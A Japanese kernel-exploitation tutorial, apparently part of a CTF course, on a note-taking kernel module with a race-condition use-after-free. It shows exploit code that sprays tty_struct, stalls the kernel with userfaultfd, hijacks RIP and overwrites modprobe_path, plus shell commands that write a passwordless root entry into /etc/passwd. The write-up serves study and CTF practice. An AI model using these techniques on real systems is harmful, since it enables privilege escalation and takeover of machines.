---
title: "UAF / TOCTOU"
description: "SLUBにおけるUAFとTOCTOU"
draft: false
weight: 4
---

## Challenge

[[Distribution File]](https://r2.p3land.smallkirby.com/uaf-fd0b9631156a3c931847e9d3ed75c8a94da196b804f28636472d635800313a99.tar.gz)

[[vmlinux with debug symbols]](https://r2.p3land.smallkirby.com/vmlinux-uaf.tar.gz)

```sh
nc sc skb.pw 49408
```

## Challenge概要とTOCTOU

LKM概要です。
いい加減ノートアプリばっかで飽きますね、でもシンプルな問題作りやすいので許してください:

```c
typedef struct {
  size_t size;
  char *buf;
} note;
note *notes[MAX_NUM_NOTE] = {0};

long uaf_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  long ret = 0;
  uaf_ioctl_req req;
  int idx = 0;
  note *target = NULL;

  if (copy_from_user(&req, (uaf_ioctl_req *)arg, sizeof(uaf_ioctl_req))) {
    ret = -EFAULT;
    goto out;
  }

  switch (cmd) {
    case UAF_IOCTL_CREATE:
      if ((idx = find_empty_note()) == -1) {
        ret = -ENOMEM;
        goto out;
      }
      if (req.size <= 0 || req.size > MAX_SIZE_NOTE) {
        ret = -EINVAL;
        goto out;
      }
      if ((target = kzalloc(sizeof(note), GFP_KERNEL)) == NULL) {
        ret = -ENOMEM;
        goto out;
      }
      notes[idx] = target;
      if ((target->buf = kzalloc(req.size, GFP_KERNEL)) == NULL) {
        kfree(target);
        ret = -ENOMEM;
        goto out;
      }
      target->size = req.size;
      if (copy_from_user(target->buf, req.buf, req.size)) {
        kfree(target->buf);
        kfree(target);
        ret = -EFAULT;
        goto out;
      }

      ret = idx;
      break;
    case UAF_IOCTL_READ:
      if (req.idx < 0 || req.idx >= MAX_NUM_NOTE ||
          (target = notes[req.idx]) == NULL) {
        ret = -EINVAL;
        goto out;
      }
      if (copy_to_user(req.buf, target->buf, target->size)) {
        ret = -EFAULT;
        goto out;
      }
      break;
    case UAF_IOCTL_DELETE:
      if (req.idx < 0 || req.idx >= MAX_NUM_NOTE ||
          (target = notes[req.idx]) == NULL) {
        ret = -EINVAL;
        goto out;
      }
      kfree(target->buf);
      kfree(target);
      notes[req.idx] = NULL;
      break;
    default:
      ret = -EINVAL;
  }

out:
  return ret;
}
```

前回と同様に、`struct note`を作成・読み取り・削除することができます。
ただし、前回とは違いノート本体は`struct note`中ではなく、別途確保された領域(`buf`)に入ります。
また、オーバーフローはありません。

今回の脆弱性は **TOCTOU (Time of Check to Time of Use)** というタイプのものです。
**Race Condition**とか言うこともあります。
ある変数などの整合性をチェックしてから、実際にその変数を使うまでの間に変数の状態が変わってしまい、
利用時には不正な状態になっていることを指します。
`UAF_IOCTL_CREATE`では、以下のような流れでノートを作成しています:

1. 空いている`notes`のインデックスを探す (`find_empty_note`)
2. `note`を確保する (`kzalloc`)
3. `note->buf`を確保する (`kzalloc`)
4. `notes[idx]`に`note`をセットする
5. `note->buf`にユーザーからの入力をコピーする (`copy_from_user`)

しかし、4と5の間に`UAF_IOCTL_DELETE`が呼ばれてしまうとどうなるでしょうか。
`DELETE`では、`notes[idx]`に入っているノートを`kfree`してしまいます。
よって、`CREATE`側の5では`kfree`した領域に対して`copy_from_user()`してしまうことになります。
解放した領域に対する書き込みなので、 **UAF**です。

そもそもこのような競合が起きてしまっているのは、関数内で適切に **lock** を取っていないためです。
本来であれば、`notes`に同時にアクセスできないように`notes`に触る前にlockを取り、
`notes`に触り終わったらlockを解放する必要があります。

## tty_struct

UAFで`buf`の上に重ねる構造体を選ぶ必要があります。
今回は便利構造体の一つである`struct tty_struct`([/include/linux/tty.h]())を使いましょう:

```c
struct tty_struct {
	struct kref kref;
	struct device *dev;
	struct tty_driver *driver;
	const struct tty_operations *ops;
	int index;
  ...
}
```

本当はもっと巨大で、この構造体は`kmalloc-1024`に入ります。
この構造体は、`/proc/ptmx`等のデバイスファイルを開いたときに確保されます。

まずは`/proc/ptmx`の作成箇所を見てみましょう([/drivers/tty/pty.c]()):

```c
static struct file_operations ptmx_fops __ro_after_init;

static void __init unix98_pty_init(void)
{
  ...
	tty_set_operations(ptm_driver, &ptm_unix98_ops);
  ...
	tty_default_fops(&ptmx_fops);
	ptmx_fops.open = ptmx_open;

	cdev_init(&ptmx_cdev, &ptmx_fops);
	if (cdev_add(&ptmx_cdev, MKDEV(TTYAUX_MAJOR, 2), 1) ||
	    register_chrdev_region(MKDEV(TTYAUX_MAJOR, 2), 1, "/dev/ptmx") < 0)
		panic("Couldn't register /dev/ptmx driver");
	device_create(tty_class, NULL, MKDEV(TTYAUX_MAJOR, 2), NULL, "ptmx");
}
```

`/dev/ptmx`の`fops`として`ptmx_fops`を指定したあと、`.open`フィールドを`ptmx_open`に変えています。
よって、`/dev/ptmx`をopenすると`ptmx_open`([/drivers/tty/pty.c]())が呼ばれることになります:

```c
static int ptmx_open(struct inode *inode, struct file *filp)
{
	struct tty_struct *tty;
  ...
	tty = tty_init_dev(ptm_driver, index);
  ...
}

struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)
{
  ...
	tty = alloc_tty_struct(driver, idx);
  ...
}
```

この`tty_struct`が便利な理由は、kbase leak / heap leak / RIPの奪取を全てこの構造体が出来るためです。

### kbase leak

`alloc_tty_struct()`の中で以下のような箇所があります:

```c
struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
{
  ...
	INIT_WORK(&tty->hangup_work, do_tty_hangup);
  ...
	tty->ops = driver->ops;
  ...
}
```

ここで、`/dev/ptmx`の場合には`driver`は`static struct tty_driver *ptm_driver`([/drivers/tty/pty.c]())です。
このドライバの`ops`は上の`unix98_pty_init()`において`ptm_unix98_ops`として初期化されています。
すなわち、`/dev/ptmx`の`tty_struct.ops`は`ptm_unix98_ops`であり、この値をleakすることでKASLRをバイパスすることができます。

ちなみに、`alloc_tty_struct()`では`tty->hangup_work`に対して`do_tty_hangup`を代入しています。
これもKASLRのバイパスのためにleakに使うことができます。
とりわけ、今回は所持上で`tty_struct`の前半を読み取ることができないため、最後の方においてある`tty_struct.hangup_work`を読むことでKASLRをバイパスします。

### heap leak

`tty_struct`の中にはheapのアドレスもたくさんおいてあるため、heapのleakに使うことができます。
例えば、`struct ld_semaphore ldisc_sem`メンバ([/include/linux/tty_ldisc.h]())があります:

```c
struct ld_semaphore {
	atomic_long_t		count;
	raw_spinlock_t		wait_lock;
	unsigned int		wait_readers;
	struct list_head	read_wait;
	struct list_head	write_wait;
};
```

この中で`list_head`型が自分自身を指している(場合がある)ため、
`tty_struct.ldisc_sem.read_wait->prev`を読むことでheapのアドレス(というか`tty_struct`自身)をleakすることができます。

### RIPの奪取

`tty_struct`の中には`struct tty_operations ops`があります。
これは、開いた`/dev/ptmx`ファイルに対する操作を司ります。
[kbase leak](#kbase-leak)でも見たように、デフォルトで`ptm_unix98_ops`が入っています。

例えば、`/dev/ptmx`で開いたファイルの`struct file`には`.f_op->ioctl`として`tty_ioctl()`が入っています([/drivers/tty/tty_io.c]()):

```c
long tty_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
	struct tty_struct *tty = file_tty(file);
  ...
	if (tty_paranoia_check(tty, file_inode(file), "tty_ioctl"))
		return -EINVAL;
  ...
	retval = tty->ops->ioctl(tty, cmd, arg);
	if (retval != -ENOIOCTLCMD)
		return retval;
  ...
}
```

この関数では、`tty->ops->ioctl`を呼び出します。
よって、`tty_struct.ops`を偽物のvtableが入ったアドレスに書き換えることにより、任意の関数を呼び出すことができます。

## スレッドを使った力技の競合

さて、`tty_struct`について少し座学をしたので実際に競合状態を起こしてみましょう。
最初に`CREATE`での競合について書きましたが、`READ`でも競合がおきます。
`READ`の正しい流れは以下です:

1. `note[req.idx]`が存在することを確認する。
2. `note[req.idx]->buf`をユーザ領域ににコピーする

ここで1と2の間、もしくは2が完了するまでの間に`DELETE`が呼ばれ、
かつfreeされた領域に`tty_struct`を確保することができれば
`copy_to_user`で`tty_struct`の中身がleakできるはずです。
`copy_to/from_user()`関数は割と重い関数のため、
1と2の間に`DELETE`を入れるのは難しかったとしても、
2が完了するまでにはそれなりに時間があるはずです。

よって、スレッドを大量に立てて力技でleakしてみましょう。
以下の3つのスレッドを立てます。

1. `idx`が0のノートからひたすらに`READ`し続ける。もしも`0`以外の値が読めたら成功。
2. `idx`0のノートをひたすらに`DELETE`し続ける。もちろん`DELETE`と`DELETE`の間にスレッド3が呼ばれないとエラーになるけど無視。
3. ノートをひたすら`CREATE`し続ける。もちろん`DELETE`した回数を上回るとノートの個数上限に引っかかるけど無視。

これのPoCが以下のようになります:

```c
int start = 0, stop = 0;

void *reader_func(void *arg) {
  char buf[0x400] = {0};
  while (!start)
    ;
  puts("[+] START: reader_func");
  do {
    read_note(fd, 0, buf);
    if (((ulong *)buf)[0x55] != 0x0) {
      puts("[!] Found UAF!");
      stop = 1;
    }
  } while (!stop);

  print_curious(buf, 0x400, 0x0);
  return NULL;
}

void *creater_func(void *arg) {
  char buf[0x400] = {0};
  while (!start)
    ;
  puts("[+] START: creater_func");
  do {
    create_note(fd, 0x400, buf);
    usleep(1000);
  } while (!stop);

  puts("[+] END: creater_func");
  return NULL;
}

void *deleter_func(void *arg) {
  char buf[0x400] = {0};
  while (!start)
    ;
  puts("[+] START: deleter_func");
  do {
    delete_note(fd, 0);
  } while (!stop);

  puts("[+] END: deleter_func");
  return NULL;
}

void *tty_func(void *arg) {
  while (!start)
    ;
  puts("[+] START: tty_func");

  do {
    int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    assert(fd > 0);
    close(fd);
  } while (!stop);

  return NULL;
}

int main(int argc, char *argv[]) {
  pthread_t reader, creater, deleter, tty;
  int reader_sfd, creater_sfd, deleter_sfd, tty_sfd;
  char buf1[0x400] = {0}, buf2[0x400] = {0};
  if ((fd = open(DEV_PATH, O_RDONLY)) < 0) {
    perror("[-] open");
    exit(EXIT_FAILURE);
  }

  reader_sfd = pthread_create(&reader, NULL, reader_func, NULL);
  creater_sfd = pthread_create(&creater, NULL, creater_func, NULL);
  deleter_sfd = pthread_create(&deleter, NULL, deleter_func, NULL);
  tty_sfd = pthread_create(&tty, NULL, tty_func, NULL);

  puts("[+] Starting threads...");
  start = 1;

  pthread_join(reader, NULL);
  pthread_join(creater, NULL);
  pthread_join(deleter, NULL);
  pthread_join(tty_sfd, NULL);

  puts("[ ] END of life...");
}
```

上のPoCを動かしてみましょう。
ただし、コア数1だと滅多に競合しないため少しずるをして4コアくらいでやってみましょう。
コア数を変えるには、`run.sh`に`-smp 4`のように追加してください。
これで走らせると以下のようになります:

```sh
/ $ ./exploit
[+] Starting threads...
[+] START: creater_func
[+] START: reader_func
[+] START: tty_func
[+] START: deleter_func
[!] Found UAF!
[0x0] 0x00000400
[0x1] 0xffff8880027c47b0
[0x2] 0x00000400
[0x3] 0xffff8880027c47c0
[0x5] 0xffff8880027c47f0
[0x7] 0xffff8880027c4800
[0x9] 0xffff8880027c4810
[0xb] 0xffff8880027c4820
```

kernel領域のアドレスのようなものがleakできていることがわかりますね！
いい感じに競合しています。

## userfaultfdによる競合

しかしこの場合、スレッドによる競合はかなりタイミングがシビアです。
よって、`userfaultfd`という仕組みを使うことにしましょう。

### userfaultfdの仕組み

[`userfaultfd`](https://man7.org/linux/man-pages/man2/userfaultfd.2.html)は、ユーザ空間でページフォルトが起きた場合にユーザ空間でそのフォルトを処理できるようにするsyscallです([/fs/userfaultfd.c]()):

```c
SYSCALL_DEFINE1(userfaultfd, int, flags)
{
	if (!userfaultfd_syscall_allowed(flags))
		return -EPERM;

	return new_userfaultfd(flags);
}
```

この関数は`[userfaultfd]`という名前のannonymous inodeを作成します。
`struct file`の`private_data`メンバに対して`struct userfaultfd_ctx`を、
`f_ops`として`userfaultfd_fops`をセットしてユーザに`fd`を返します。

{{< alert title="Unprivileged userfaultfd" color="info" >}}
`userfaultfd`を呼ぶと、`userfaultfd_syscall_allowed()`によって本当に`userfaultfd`を呼んで良いかがチェックされます。
まず、`CAP_PTRACE`を持つユーザは無条件に許可されます。
そうでない場合には、`unprivileged_userfaultfd`変数が`true`の場合のみ許可されます。
この変数は`/proc/sys/vm/unprivileged_userfaultfd`に対する書き込みで設定することができ、
今回のChallengeでは`1`に設定されているため権限のないユーザでも`userfaultfd`を呼ぶことができます。
{{< /alert >}}


`userfaultfd`を呼んだ直後は、`userfaultfd_ctx.state`は`UFFD_STATE_WAIT_API`にセットされています。
この状態を進めるためには、`fd`に対して`UFFDIO_API`を引数として`ioctl`してあげる必要があります。
この処理は状態を`UFFD_STATE_RUNNING`に進めると同時に、
このkernelでサポートされているUFFDの機能を教えてくれます。
以下のように呼び出します:

```c
struct uffdio_api uffdio_api;
uffdio_api.api = UFFD_API;
uffdio_api.features = 0;
if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
  errExit("ioctl-UFFDIO_API");
```

次にやるべきことは、userlandのどの領域におけるフォルトを監視するかどうかの設定です。
そのためには`ioctl`を`UFFDIO_REGISTER`という引数で呼び出します:

```c
struct uffdio_register uffdio_register;
uffdio_register.range.start = addr;
uffdio_register.range.len = len;
uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
  errExit("ioctl-UFFDIO_REGISTER");
```

`start` / `len`によって監視すべきメモリ領域を指定しています。

`mode`はどのようなフォルトを監視するかを設定します
([userfaultfd_register()@/fs/userfaultfd.c]())。
よく使うのは以下です:

- `UFFDIO_REGISTER_MODE_MISSING`: ページが存在しない場合を監視
- `UFFDIO_REGISTER_MODE_WP`: ページが存在するが書き込み禁止の場合を監視

さて、実際のページフォルトは`handle_page_fault()`([/arch/x86/mm/fault.c]())で処理されます。
ここでは、フォルトが起きたアドレスがuser/kernelのどちらであるかを検証し、
userlandである場合には`do_user_addr_fault()`を呼びます。

例えばこのフォルトが`mmap`されたページへの初回書き込みであった場合には、
最終的に`do_annonymous_page()`([/mm/memory.c]())という関数が呼ばれます:

```c
static vm_fault_t do_anonymous_page(struct vm_fault *vmf)
{
		if (userfaultfd_missing(vma)) {
			pte_unmap_unlock(vmf->pte, vmf->ptl);
			return handle_userfault(vmf, VM_UFFD_MISSING);
		}
}
```

`handle_userfault()`では、`ctx->fault_pending_wqh`に対してこのイベントを通知します。
これによって、次にユーザがイベントをpollした際にこのイベントを取得でき、
フォルトをハンドリングすることができます。
なお、kernelのフォルトハンドラはユーザのフォルトハンドラが返ってくるまで処理を中止するため、
ハンドリングが終わったら適切にkernelに通知してあげる必要があります。

{{< alert title="mmapとフォルト" color="info" >}}
`mmap`を`MAP_ANONYMOUS`で行った場合、実際には新しいVMAを生成するだけでページテーブル(PTE)は作成しません。
初回書き込みがあった場合にはフォルトが発生し、上記のルートを辿って初めてPTEが作成されます。
また、PTEが作成されていない状態で読み込みをするとPTEはつくられず、無条件にNULLページが返されます。
{{< /alert >}}

### userfaultfdの使い方

少しだけ仕組みを理解したので、実際に使ってみましょう。

まず、以下のようなコードで`0xDEAD000`アドレスに対して`mmap`します。
また、`uffdio_register`を用いて`mmap`したアドレスとサイズを登録し、`uffd_handler`という関数をスレッドでは知らせます:

```c
struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;

int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);

// enable uffd object via ioctl(UFFDIO_API)
uffdio_api.api = UFFD_API;
uffdio_api.features = 0;
if (ioctl(uffder->uffd, UFFDIO_API, &uffdio_api) == -1)
  errExit("ioctl-UFFDIO_API");

// mmap
printf("[%s] mmapping...\n", uffder->name);
void *addr = mmap(
    base, 0x1000,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,
    0);  // set MAP_FIXED for memory to be mmaped on exactly specified addr.

// specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
uffdio_register.range.start = 0xDEAD000;
uffdio_register.range.len = 0x1000;
uffdio_register.mode = uffder->watch_mode;
if (ioctl(uffder->uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
  errExit("ioctl-UFFDIO_REGISTER");

int s = pthread_create(&uffder->thr, NULL, uffd_handler, uffd);
```

このハンドラは以下のようになっています。
まず、`userfaultfd`を`poll()`で延々と監視し続けます。
イベントが発生した場合には、その中身を読み取って意図したイベント(`UFFD_EVENT_PAGEFAULT`)であることを確認します。
この時点で、kernelのフォルト処理は中断されているため好きなことをすることができます。
やりたいことをし終わったら、kernelに処理を戻します。
どのようにしてフォルトを処理するかにはいくつか方法がありますが、
今回は`UFFDIO_COPY`というフォルトが起きたページに対して好きなページをコピーさせるという処理をすることにします。
今回の場合は、フォルトが起きたページに対して`0xBEEF000`というアドレスにあるページをコピーして、
フォルト処理を終了させています。

```c
static void *uffd_handler(void *arg) {
  long uffd = arg;
  static struct uffd_msg msg;
  struct uffdio_copy uffdio_copy;
  struct pollfd pollfd;
  int nready;

  // set poll information
  pollfd.fd = uffd;
  pollfd.events = POLLIN;

  // wait for poll
  while (poll(&pollfd, 1, -1) > 0) {
    if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP) errExit("poll");

    // read an event
    if (read(uffd, &msg, sizeof(msg)) <= 0) errExit("read event");
    if (msg.event != UFFD_EVENT_PAGEFAULT) errExit("unexpected pagefault");

    printf("[!] page fault @ %p\n", (void *)msg.arg.pagefault.address);

    /** ここで好きなことをやる **/

    // copy customized page into faulted page
    uffdio_copy.src = 0xBEEF000;
    uffdio_copy.dst = (ulong)msg.arg.pagefault.address & ~(0x1000 - 1);
    uffdio_copy.len = uffder->num_page * 0x1000;
    uffdio_copy.mode = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      errExit("ioctl-UFFDIO_COPY");

    break;
  }
}
```

## kbaseのleak

さて、実際に`userfaultfd`を使ってkbaseをleakしてみましょう。

`userfaultfd`を使うことで、`READ`処理の途中にある`copy_to_user()`でLKMがユーザ領域にアクセスしてきたときに
処理を中断させてユーザに戻すことができます。
もちろん、このLKMに対して渡すバッファとして`mmap`した領域を渡す必要があります。

```c
char *cpysrc_read =
    mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
int victim_note_idx = create_note(fd, 0x400, buf1);

/** ここでuserfaultfdで`ADDR_FAULT_READ`アドレスを登録する **/

read_note(fd, victim_note_idx, (char *)ADDR_FAULT_READ);
```

`read_note`でフォルトが発生し、登録したハンドラに処理が移ります。
この中でノートを`DELETE`したあと、`/dev/ptmx`を開いて`tty_struct`を確保します。
これによって、今まさに`READ`しようとして中断しているノートが解放され、
さらにそこに`tty_struct`が置かれることになります:

```c
void *read_fault_handler(void *arg)
{
  ...
  delete_note(fd, victim_note_idx);
  assert((tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY)) > 0);
  ...

  /** ここでUFFDIO_COPYする **/
}
```

このハンドラを呼び出して、最終的に処理をkernelに戻すと`copy_to_user()`が再開されます。
しかし、この時には既に目的のノートは解放され、`tty_struct`に置き換わっています。
よって、このノートを読むことで`tty_struct`の中身を全てleakすることができます。

[kbase leak](#kbase-leak)で書いたように、
今回はkbaseのleakとして`tty_struct.hangup_work`を読み取ることができます。
また、heapのleakとして`tty_struct.ldisc_sem.read_wait->prev`を読み取ることができます。
それぞれのフィールドがどのオフセットにあるのかは、
配布した`vmlinux`をGDBで読み込んで`ptype/o struct tty_struct`コマンドを叩くことで調べられるので、
実際に手を動かして調べてみてください。

## RIPの奪取

続いてRIPを取りましょう。

[RIPの奪取](#ripの奪取)で書いたように、`tty_struct.ops`に偽物のvtableアドレスを書いてあげることで
任意の関数を呼び出すことができます。

UAFを使って`tty_struct`に書き込むには、`READ`の場合と同様に以下のような手順を踏みます:

1. ノートを作成する際に`copy_from_user()`に渡すユーザランドバッファを`userfaultfd`で登録する
2. ノートを作成しようとする
3. `copy_from_user()`でフォルトが起きてユーザに処理が移る
4. ハンドラで`DELETE`を呼び出す
5. ハンドラで`/dev/ptmx`を開く
6. フォルトを戻して、`copy_from_user()`を再開する。これは`tty_struct`への書き込みになる。

今回は問題の制約上`tty_struct`の一部分だけを書き換えるということはできず、
`0x400`分全て書き換える必要があります。
まぁ、`tty_struct`は結構丈夫な構造体なので大丈夫です。

フォルトハンドラでコピーするページを`char *cpysrc`とすると、`tty_struct`に書き込む値は以下のようにします:

```c
#define TTY_OPS_OFFSET 0x50
ulong *tty = (ulong *)cpysrc;
*tty++ = 0x5401;                     // magic, kref
*tty++ = tty_heap;                   // dev
*tty++ = tty_heap + TTY_OPS_OFFSET;  // driver
*tty++ = tty_heap + TTY_OPS_OFFSET;  // ops
ulong *ops = (ulong *)(cpysrc_create + TTY_OPS_OFFSET);
for (int ix = 0; ix != 0x100 / 8; ++ix) {  // ops
  ops[ix] = 0xDEADBEEFCAFEBABE; // paranoia
}
```

まず、`tty_ioctl`の先頭で`tty_paranoia_check()`という関数が走り、
`.magic`に入っているマジックナンバーが正しいものかが検証されるため、
ここには`0x5401`という値を入れておく必要があります。

その他は割と自由です。
今回は偽のvtableを`tty_struct + 0x50`に置くことにします。
また、このvtableは中身を全て`0xDEADBEEFCAFEBABE`にしておきます。
とりあえずOopsを起こしてちゃんとRIPが取れているかを確認するためだけの値です。

`tty_struct`を上記のように書き換えた状態で
`/dev/ptmx`の`fd`に対して`ioctl`を呼び出すと以下のようになります:

```sh
[!] Invoking fake tty->ops
general protection fault, probably for non-canonical address 0xdeadbeefcafebabe: 0000 [#1] SMP PTI
CPU: 0 PID: 161 Comm: exploit Tainted: G           O      5.15.0 #7
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:tty_ioctl+0x3a5/0x920
Code: 44 89 e6 4c 89 ef e8 ca 07 68 00 3d fd fd ff ff 0f 85 d2 fd ff ff 4c 89 ef e8 f7 64 00 00 48 89 c3 48 82
RSP: 0018:ffffc9000047bdf8 EFLAGS: 00000286
RAX: deadbeefcafebabe RBX: deadbeefcafebabe RCX: 00000000706d742f
RDX: 0000000000000000 RSI: 7fffffffffffffff RDI: ffff8880032f5028
RBP: ffffc9000047bea0 R08: ffffffff81e38280 R09: 0000000000000000
R10: ffff888002d368a8 R11: 0000000000000000 R12: 00000000706d742f
R13: ffff8880032f5000 R14: ffffffff81e38280 R15: ffff8880032a9900
FS:  00000000004ef3c0(0000) GS:ffff88800f600000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00000000004efd68 CR3: 00000000032f2000 CR4: 00000000003006f0
```

ちゃんとvtableに入れておいた値にRIPがなっています。
RIPが取れました。

## AAW

さて、RIPがとれたのであとは色々できます。

今回はSMEP/SMAPが有効なため、userlandのコードを動かしたり、userlandにstack pivotすることはできません
(厳密に言うと、SMAP/SMEPはCR4レジスタを操作することで無効化出来るためstack pivotくらいならできますが)。
また、`tty_ioctl`では呼び出し直後に引数として`tty_struct`自身のアドレスが入るため、
`tty_struct`上にROP chainを構築することもできますが、今回は他の方法を取ることにします。

目的のためには、AAWが出来るようにしたいです。
`ioctl(tty_fd, 0xabcdefg, 0x1234567)`で`ops->ioctl`を呼び出した直後には、レジスタは以下のようになっています:

```txt
$rax   : 0xffffffff81049018 <ptep_set_access_flags+0x18>  ->  0x0000441f0fc30a89
$rbx   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
$rcx   : 0xbcdefg
$rdx   : 0x1234567
$rsp   : 0xffffc9000045bdf0  ->  0xffffffff813801b6 <tty_ioctl+0x386>  ->  0xd2850ffffffdfd3d
$rbp   : 0xffffc9000045bea0  ->  0xffffc9000045bf30  ->  0xffffc9000045bf48  ->  0x0000000000000000 <fixed_percpu_data>
$rsi   : 0xabcefg
$rdi   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
$rip   : 0xffffffff81049018 <ptep_set_access_flags+0x18>  ->  0x0000441f0fc30a89
$r8    : 0x1234567
$r9    : 0x0
$r10   : 0xffff888002d368a8  ->  0x00000000000d21b6
$r11   : 0x0
$r12   : 0xabcdefg
$r13   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
$r14   : 0x1234567
$r15   : 0xffff888003277100  ->  0x0000000000000000 <fixed_percpu_data>
```

`$rcx`が第2引数(4byte)、`$rdx`が第3引数(8byte)になっていることがわかりますね。
よって、以下のようなgadgetを使いましょう:

```S
mov [rdx], ecx
```

このgadgetを指定することで、第3引数で指定してアドレスに第2引数で指定した任意の4byteを書き込むことができます。
AAW達成です。

## modprobe_path

AAWが達成でき、かつkbaseも求められています。
こんなときは、`modprobe_path`というkernel変数を書き換えてしまうことで簡単にrootが取れます。

`modprobe_path`は、あるプログラムを実行しようとしたときに、対応するハンドラが見つからない場合にデフォルトで呼び出されるプログラムのパスを保持しています。
「プログラムに対応するハンドラ」というのは、
Cのプログラムであれば`ld`、
shebangとして`#!/usr/bin/python`と書かれたスクリプトならば`python`と言った感じです。

`modprobe_path`はデフォルトで`/sbin/modprobe`になっています。
また、これが呼び出されるときにはroot権限で実行されます。
よってこの変数を書き換えてしまえば、謎のバイナリを動かす際に任意のプログラムをroot権限で動かすことが可能となります。

{{< alert title="modprobe_pathをもっと知りたいあなたに" color="info" >}}
ただでさえ本章は長くなってしまっているため、`modprobe_path`の説明は最低限に抑えました。
もっとその実装やkernelコードを知りたい場合には、[以前筆者が書いた資料](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)を参照してみてください。
{{< /alert >}}

exploitでは、まず以下のように「謎のプログラム」(`/tmp/nirugiri`)と「`modprobe_path`に指定してrootで動かしたいスクリプト」(`/tmp/a`)を作成します:

```c
system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/nirugiri");
system(
    "echo -e \"#!/bin/sh\necho 'root::0:0:root:/root:/bin/sh' > "
    "/etc/passwd\" > /tmp/a");
system("chmod +x /tmp/nirugiri");
system("chmod +x /tmp/a");
```

`nirugiri`は`0xFF`だけで構成される4byteバイナリであり、
このようなファイルに対するハンドラは存在しないため`modprobe_path`で指定されるプログラムが実行されることになります。
また、`modprobe_path`として今回は`/tmp/a`というシェルスクリプトを書きます。
このスクリプトは、`/etc/passwd`に`root::0:0:root:/root:/bin/sh`という行を追加するものです。
`/etc/passwd`は3番目のフィールド(1-origin)に`0`を書き込むとパスワードなしという意味になります。
よって、この行を`/etc/passwd`に書き込むことで`root`ユーザにパスワード無しで`su`することができるようになります。

続いて、先程得たAAWプリミティブを使って`modprobe_path`に`/tmp/a`と書き込みます。
この際、4byteずつしか書き込めないことに注意してください:

```c
char *fname = "/tmp/a\x00";
ioctl(tty_fd, ((uint *)fname)[0], modprobe_path);
ioctl(tty_fd, ((uint *)fname)[1], modprobe_path + 4);
```

最後に、「謎のプログラム」を実行すれば`modprobe_path`がrootで実行されます:

```c
system("/tmp/nirugiri");
system("/bin/sh -c su");
```

----------------------------------------

ここまでの手順で、`userfaultfd`を使って安定した競合状態を引き起こし、UAFを発生させる方法の説明が終わりです。
皆さんも是非リモートでフラグをとってみてください。

なお、exploitを実際に書いてみるといくつか嵌りそうなポイントがあると思います。
手を動かすことが大事なのでとりあえずGDBでデバッグしてみて、
少し考えて分からなければDiscordで聞いてください。
